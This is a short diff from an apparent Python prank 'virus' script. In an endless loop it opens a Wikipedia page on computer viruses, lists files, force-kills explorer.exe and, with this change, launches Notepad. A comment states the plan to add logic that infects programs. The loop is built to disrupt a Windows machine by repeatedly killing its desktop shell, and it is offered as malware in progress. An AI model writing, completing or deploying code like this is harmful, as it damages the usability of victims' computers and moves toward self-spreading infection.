@@ -51,6 +51,6 @@ while True:
     os.system("start https://en.wikipedia.org/wiki/Computer_virus")
     os.system("tree /f")
     os.system("cd system32 && taskkill /f /im explorer.exe")
-
+    os.system("start notepad.exe")
 
 # TODO: Need to implement a logic to infect programs.
